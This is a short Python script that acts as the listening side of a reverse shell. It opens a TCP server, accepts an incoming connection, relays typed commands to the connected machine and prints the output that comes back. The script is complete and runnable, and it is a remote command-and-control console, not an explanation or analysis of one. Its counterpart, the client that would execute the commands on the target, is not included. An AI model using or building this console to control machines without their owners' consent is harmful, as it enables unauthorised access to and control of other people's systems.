import socket

HOST = ""  # Your local IP
PORT = 10000  # Your open port
client = socket.socket()


def socket_bind():
    try:
        print("Creating server...")
        client.bind((HOST, PORT))
        client.listen()
        print("Server created.")
    except socket.error as e:
        print(f"Error: {e}\nRetrying")
        socket_bind()


def socket_accept():
    print("Waiting for connections..")
    conn, address = client.accept()
    print(f"Connection has been established | IP {address[0]} | Port {address[1]}")
    send_commands(conn)
    conn.close()


def send_commands(conn):
    while True:
        command = input(">")
        if command == "quit":
            conn.close()
            client.close()
            exit()
        if len(command) > 0:
            conn.send(command.encode())
            output = conn.recv(131072).decode("utf-8", "ignore")
            print(output, end="")


if __name__ == '__main__':
    socket_bind()
    socket_accept()
